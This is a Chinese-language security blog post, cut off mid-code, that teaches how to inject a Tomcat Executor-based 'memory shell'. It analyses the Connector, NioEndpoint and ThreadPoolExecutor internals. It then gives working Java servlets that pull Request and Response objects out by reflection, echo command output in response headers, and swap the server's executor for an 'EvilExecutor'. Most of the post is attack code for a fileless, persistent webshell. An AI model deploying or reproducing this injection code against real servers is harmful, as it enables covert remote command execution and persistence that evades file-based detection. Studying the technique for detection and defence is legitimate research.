        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>之前学习的传统Web应用型内存马都是基于Container的，本文来学习一下基于Connector的内存马注入。</p><p>下图中展示了Connector的构成，Connector主要由ProtocolHandler与Adapter构成，ProtocolHandler主要由Endpoint与Processor组成。</p><p><img src="/2024/05/18/Tomcat-Executor/1.png"></p><p>ProtocolHandler分类如下：</p><p><img src="/2024/05/18/Tomcat-Executor/2.png"></p><p>Endpoint是ProtocolHandler的组成之一，而NioEndpoint是Http11NioProtocl中的实现。Endpoint五大组件：</p><ul><li><p>LimitLatch：连接控制器，负责控制最大的连接数，如果超过了此连接，Tomcat会将此连接线程阻塞等待，等里面有其他连接释放了再消费此连接；</p></li><li><p>Acceptor：负责接收新的连接，然后返回一个Channel对象给Poller；</p></li><li><p>Poller：可以将其看成是Nio中Selector，负责监控Channel的状态；</p></li><li><p>SocketProcessor：可以看成是一个被封装的任务类；</p></li><li><p>Executor：Tomcat自己扩展的线程池，用来执行任务类。</p></li></ul><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>跟进一下Executor组件，跟进一下其execute方法在哪实现的。</p><p><img src="/2024/05/18/Tomcat-Executor/3.png"></p><p>跟进org.apache.catalina.core.StandardThreadExecutor#execute方法，当executor不为null时，其会调用executor的execute方法。</p><p><img src="/2024/05/18/Tomcat-Executor/4.png"></p><p>跟进org.apache.tomcat.util.threads.ThreadPoolExecutor#execute方法，因此，假设能创建一个继承ThreadPoolExecutor的恶意Executor，并重写其中的execute方法，那么在调用该方法的时候将能够执行恶意代码。</p><p><img src="/2024/05/18/Tomcat-Executor/5.png"></p><p>有了上面的思路，现在的重点在于如何将属性executor设置为创建的恶意Executor。跟进org.apache.tomcat.util.net.AbstractEndpoint#setExecutor方法，利用该方法可以将原本的Exector置换为创建的恶意Exector。</p><p><img src="/2024/05/18/Tomcat-Executor/6.png"></p><p>现在知道了如何创建恶意的Executor和如何修改属性executor为恶意的Executor，获取Request和Response又成为了现在的重点，这里利用工具<a href="https://github.com/c0ny1/java-object-searcher">java-object-searcher</a>来获取Request对象。搜索的语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;Response&quot;</span>).build());</span><br><span class="line">List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line"><span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);</span><br><span class="line">searcher.setBlacklists(blacklists);</span><br><span class="line">searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line">searcher.setMax_search_depth(<span class="number">20</span>);</span><br><span class="line">searcher.setReport_save_path(<span class="string">&quot;/Users/alphag0/Desktop&quot;</span>);</span><br><span class="line">searcher.searchObject();</span><br></pre></td></tr></table></figure><p>利用该工具可以找到一处位于NioEndpoint中的nioChannels的appReadBufHandler，其中的Buffer存放着所需要的request（利用点不唯一）。</p><p><img src="/2024/05/18/Tomcat-Executor/7.png"></p><p>通过层层反射来获取Buffer的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125; </span><br><span class="line">   ---&gt; group = &#123;java.lang.ThreadGroup&#125; </span><br><span class="line">    ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; </span><br><span class="line">     ---&gt; [<span class="number">14</span>] = &#123;java.lang.Thread&#125; </span><br><span class="line">       ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint$Poller&#125; </span><br><span class="line">        ---&gt; <span class="built_in">this</span>$<span class="number">0</span> = &#123;org.apache.tomcat.util.net.NioEndpoint&#125; </span><br><span class="line">         ---&gt; nioChannels = &#123;org.apache.tomcat.util.collections.SynchronizedStack&#125; </span><br><span class="line">          ---&gt; stack = &#123;class [Ljava.lang.Object;&#125; </span><br><span class="line">           ---&gt; [<span class="number">0</span>] = &#123;org.apache.tomcat.util.net.NioChannel&#125; </span><br><span class="line">            ---&gt; appReadBufHandler = &#123;org.apache.coyote.http11.Http11InputBuffer&#125; </span><br><span class="line">              ---&gt; request = &#123;org.apache.coyote.Request&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.Http11InputBuffer;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.collections.SynchronizedStack;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.NioEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ExecutorServlet&quot;, value = &quot;/ExecutorServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecutorServlet</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ThreadGroup.class.getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] threads = (Thread[]) field.get(Thread.currentThread().getThreadGroup());</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!thread.getName().contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> Thread.class.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">pollor</span> <span class="operator">=</span> field1.get(thread);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field7</span> <span class="operator">=</span> pollor.getClass().getDeclaredField(<span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                    field7.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint1</span> <span class="operator">=</span> (NioEndpoint) field7.get(pollor);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field8</span> <span class="operator">=</span> nioEndpoint1.getClass().getDeclaredField(<span class="string">&quot;poller&quot;</span>);</span><br><span class="line">                    field8.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> field8.get(nioEndpoint1);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> o.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) field2.get(o);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> NioEndpoint.class.getDeclaredField(<span class="string">&quot;nioChannels&quot;</span>);</span><br><span class="line">                    field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">SynchronizedStack</span> <span class="variable">synchronizedStack</span> <span class="operator">=</span> (SynchronizedStack) field3.get(nioEndpoint);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> SynchronizedStack.class.getDeclaredField(<span class="string">&quot;stack&quot;</span>);</span><br><span class="line">                    field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    Object[] object = (Object[]) field4.get(synchronizedStack);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field5</span> <span class="operator">=</span> object[<span class="number">0</span>].getClass().getDeclaredField(<span class="string">&quot;appReadBufHandler&quot;</span>);</span><br><span class="line">                    field5.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Http11InputBuffer</span> <span class="variable">appReadBufHandler</span> <span class="operator">=</span> (Http11InputBuffer) field5.get(object[<span class="number">0</span>]);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field6</span> <span class="operator">=</span> appReadBufHandler.getClass().getDeclaredField(<span class="string">&quot;byteBuffer&quot;</span>);</span><br><span class="line">                    field6.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> (ByteBuffer) field6.get(appReadBufHandler);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(byteBuffer.array(), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    System.out.println(s);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Executor/8.png"></p><p>现在解决了接收Request的问题，接下来来解决回显的问题。寻找Response对象依旧可以采用同样的方式来进行查找，这里我采用下断点的方式来寻找可以利用的Response对象，这里在上文获取Request对象的Demo完成后的Response中下一个断点，然后去寻找可以利用的Response对象。</p><p><img src="/2024/05/18/Tomcat-Executor/9.png"></p><p>这里通过层层反射，往获取到的Response对象的header中添加命令执行的回显。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.Http11InputBuffer;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.collections.SynchronizedStack;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.NioEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ExecutorServlet&quot;, value = &quot;/ExecutorServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecutorServlet</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Executor Inject Successfully...&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ThreadGroup.class.getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] threads1 = (Thread[]) field1.get(Thread.currentThread().getThreadGroup());</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads1) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!thread.getName().contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;Poller&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> thread.getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> field2.get(thread);</span><br><span class="line">                    <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">Field</span> <span class="variable">field9</span> <span class="operator">=</span> target.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                            field9.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) field9.get(target);</span><br><span class="line">                            <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> AbstractEndpoint.class.getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line"><span class="comment">//                    Field field4 = AbstractProtocol.class.getDeclaredField(&quot;handler&quot;);</span></span><br><span class="line">                            field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> field4.get(nioEndpoint);</span><br><span class="line">                            <span class="type">Field</span> <span class="variable">field5</span> <span class="operator">=</span> handler.getClass().getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                            field5.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (RequestGroupInfo) field5.get(handler);</span><br><span class="line">                            <span class="type">Field</span> <span class="variable">field6</span> <span class="operator">=</span> requestGroupInfo.getClass().getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                            field6.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            <span class="type">ArrayList</span> <span class="variable">arrayList</span> <span class="operator">=</span> (ArrayList) field6.get(requestGroupInfo);</span><br><span class="line">                            <span class="keyword">for</span> (Object o : arrayList) &#123;</span><br><span class="line">                                <span class="type">Field</span> <span class="variable">field7</span> <span class="operator">=</span> o.getClass().getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                                field7.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field7.get(o);</span><br><span class="line">                                <span class="type">Field</span> <span class="variable">field8</span> <span class="operator">=</span> request1.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                                field8.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                <span class="type">Response</span> <span class="variable">response1</span> <span class="operator">=</span> (Response) field8.get(request1);</span><br><span class="line">                                response1.addHeader(<span class="string">&quot;Attack&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;H3rmesk1t&quot;</span>.getBytes(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                                System.out.println(response1);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Executor/10.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态全局替换Executor内存马的具体思路如下:</p><ul><li>首先获取对应的NioEndpoint；</li><li>获取对应的executor属性；</li><li>创建一个恶意的executor；</li><li>将恶意的executor传入。</li></ul><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.NioEndpoint;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.threads.ThreadPoolExecutor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ExecutorMemoryShellServlet&quot;, value = &quot;/ExecutorMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecutorMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) getNioEndpoint();</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> (ThreadPoolExecutor) nioEndpoint.getExecutor();</span><br><span class="line">        nioEndpoint.setExecutor(<span class="keyword">new</span> <span class="title class_">EvilExecutor</span>(executor.getCorePoolSize(), executor.getMaximumPoolSize(),</span><br><span class="line">                executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(),</span><br><span class="line">                executor.getThreadFactory()));</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Executor Inject Successfully...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object obj, String field)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getNioEndpoint</span><span class="params">()</span> &#123;</span><br><span class="line">        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                